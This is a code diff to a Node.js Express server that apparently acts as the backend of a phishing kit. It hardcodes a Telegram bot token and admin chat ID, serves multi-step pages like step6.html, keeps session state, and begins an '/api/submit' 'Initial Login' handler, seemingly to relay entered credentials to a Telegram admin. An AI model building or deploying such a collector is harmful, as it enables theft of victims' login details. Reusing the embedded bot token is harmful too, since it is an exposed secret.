@@ -1,14 +1,14 @@
-const express = require('express');
-const axios = require('axios');
-const cors = require('cors');
-const bodyParser = require('body-parser');
+const express = require("express");
+const axios = require("axios");
+const cors = require("cors");
+const bodyParser = require("body-parser");
+const crypto = require('crypto');
+
+
+const path = require("path");
 
 const app = express();
-const PORT = 5000;
-
-// --- CONFIGURATION ---
-const TELEGRAM_BOT_TOKEN = "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
-const TELEGRAM_ADMIN_ID = "7162306402";
+const PORT = process.env.PORT || 5002;
 
 // Serve all files in your folder (like index.html, step6.html, etc.)
 app.use(express.static(path.join(__dirname, "public"))); 
@@ -18,10 +18,22 @@ app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname,"public", "index.html")); 
 });
 
+
 app.use(cors());
 app.use(bodyParser.json());
+// app.use(express.static('public'));
+
+// --- TELEGRAM CONFIG ---
+const TELEGRAM_BOT_TOKEN = "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
+const TELEGRAM_ADMIN_ID = "7162306402";
+const BASE_URL = process.env.RENDER_EXTERNAL_URL ||`http://localhost:${PORT}`; // Update if deployed
+
 
 const sessions = {};
+// Test route to check if server is alive
+app.get("/", (req, res) => {
+  res.send("✅ Server is running! Ready to receive data.");
+});
 
 // 1. Initial Login
 app.post('/api/submit', async (req, res) => {
